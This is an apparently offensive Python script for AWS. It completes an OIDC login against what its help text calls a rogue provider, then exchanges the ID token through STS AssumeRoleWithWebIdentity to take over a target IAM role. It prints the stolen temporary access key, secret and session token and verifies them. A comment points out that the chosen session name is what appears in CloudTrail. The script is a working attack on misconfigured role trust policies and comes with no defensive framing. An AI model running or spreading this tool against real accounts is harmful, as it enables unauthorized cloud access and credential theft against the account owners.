#!/bin/python3

import boto3
import argparse
import requests
from urllib.parse import urlencode


def get_id_token(oidc_provider_url, client_id, client_secret, redirect_uri):
    """Obtain ID token from the OIDC provider"""
    auth_params = {
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "response_type": "code",
        "scope": "openid"
    }
    
    auth_url = f"{oidc_provider_url}/auth?{urlencode(auth_params)}"
    
    print(f"[x] Making request to: {auth_url}")
    auth_response = requests.get(auth_url)
    
    redirect_url = auth_response.url
    code = redirect_url.split("code=")[1].split("&")[0]
    print("[x] Obtained authorization code:")
    print(f"\t{code}")

    print("[x] Sending authenticated request for obtaining JWT. Results:")
    token_response = requests.post(
        f"{oidc_provider_url}/token",
        auth=(client_id, client_secret),
        json={
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": redirect_uri
        }
    )
    
    print(f"\tResponse status: {token_response.status_code}")
    print(f"\tJWT: {token_response.text}")
    
    if token_response.status_code != 200:
        raise Exception(f"Token request failed: {token_response.text}")
    
    token_data = token_response.json()
    if "id_token" not in token_data:
        raise Exception(f"No id_token in response: {token_data}")
    
    return token_data["id_token"]

def assume_role_with_web_identity(id_token, role_arn, role_session_name):
    """Assume AWS IAM role using the ID token"""
    print(f"[x] Trying to assume role {role_arn}")
    sts_client = boto3.client('sts')
    
    try:
        response = sts_client.assume_role_with_web_identity(
            RoleArn=role_arn,
            RoleSessionName=role_session_name,
            WebIdentityToken=id_token
        )
        
        credentials = response['Credentials']
        print("[x] Successfully assumed role! Credentials:")
        print(f"\tAccess Key ID: {credentials['AccessKeyId']}")
        print(f"\tSecret Access Key: {credentials['SecretAccessKey']}")
        print(f"\tSession Token: {credentials['SessionToken']}")
        print(f"\tExpiration: {credentials['Expiration']}")
        
        return credentials
        
    except Exception as e:
        print(f"Error assuming role: {str(e)}")
        raise

def main():
    parser = argparse.ArgumentParser(description='OIDC AWS role assumption script')
    
    parser.add_argument('--oidc-url', required=True, 
                       help='Rouge OIDC URL (e.g., https://oidc.example.com)')
    parser.add_argument('--client-id', required=True,
                       help='OIDC client ID')
    parser.add_argument('--client-secret', required=True,
                       help='OIDC client secret')
    parser.add_argument('--redirect-uri', required=True,
                       help='OIDC redirect URI (e.g., https://oidc.example.com)')
    parser.add_argument('--role-arn', required=True,
                       help='ARN of OIDC AWS IAM role to assume')
    parser.add_argument('--role-session-name', required=True,
                       help='This will appear as username in CloudTrail')

    args = parser.parse_args()

    try:
        print("Starting OIDC authentication flow...")
        id_token = get_id_token(
            args.oidc_url,
            args.client_id,
            args.client_secret,
            args.redirect_uri
        )
        
        credentials = assume_role_with_web_identity(id_token, args.role_arn, args.role_session_name)
        
        print("[x] Testing the credentials...")
        session = boto3.Session(
            aws_access_key_id=credentials['AccessKeyId'],
            aws_secret_access_key=credentials['SecretAccessKey'],
            aws_session_token=credentials['SessionToken'],
        )
        

        sts_client = session.client('sts')
        identity = sts_client.get_caller_identity()
        print("STS GetCallerIdentity result:")
        print(f"\tUser ID: {identity.get('UserId')}")
        print(f"\tAccount: {identity.get('Account')}")
        print(f"\tARN: {identity.get('Arn')}")
            
    except Exception as e:
        print(f"\nError: {str(e)}")

if __name__ == "__main__":
    main()
